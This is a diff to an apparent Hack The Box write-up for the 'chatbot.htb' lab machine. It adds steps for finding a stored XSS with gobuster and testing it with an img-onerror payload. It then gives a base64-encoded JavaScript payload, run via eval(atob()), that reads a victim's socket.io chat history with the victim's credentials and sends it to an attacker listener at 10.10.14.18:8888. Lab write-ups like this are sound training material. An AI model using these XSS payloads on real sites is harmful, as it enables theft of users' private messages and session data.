@@ -44,9 +44,30 @@ HOP RTT       ADDRESS
 ```
 
 When i analysis this site at port 80, i see it use nodejs, expressjs and auth with jwt.
-`kristenanne`
+- Use `gobuster` enumurate file and dir -> see /restricted/chat.js
+- From that file you redirect to contact page, you see xxs vul in this
+how to know
+1. fill firstname and lastname at textarea fill `<img src=x onerror="document.location='http:<yourmachine>:<port>/`"/>`
+2. Listen http server, you can use `php -S 0.0.0.0:<port>` or `python -m http.server <port>`
+3. click send -> you see in your terminal our server is received the request
+=> From chat.js, write the payload get info important from the server.
 
+```shell
+┌──(toan㉿kali)-[~]
+└─$ cat test.js                         
+const script = document.createElement('script');
+script.src='/socket.io/socket.io.js';
+document.head.appendChild(script);
+script.addEventListener('load', function() {
+const res = axios.get( /user/api/chat");
+const socket = io('/',{withCredentials: true});
+socket.on('message', (my_message) => {fetch("http://10.10.14.18:8888/?d=" + btoa(my_message))}) ;
+socket.emit('client_message', 'history');
+});
+```
+- Encode this payload, `cat test.js | base64`.
 
+- the atob func will decode base64
 `{"first_name":"a","last_name":"asdf","message":"<img src=x onerror=\"eval(atob('<payload encode base64>'))\">"}`
 
 ```shell
@@ -86,7 +107,13 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 ```
 
 =>
-```base64
+```shell
 R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM=
-SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=
+SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg=
+V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=
 ```
+[img1](./img/img1.png)
+=> you see subdomain `dev-git-auto-update.chatbot.htb`
+
+- add this domain into `/etc/hosts`.type:  `echo "10.10.11.6 dev-git-auto-update.chatbot.htb"  | sudo tee -a /etc/hosts`. goto that site!
+...
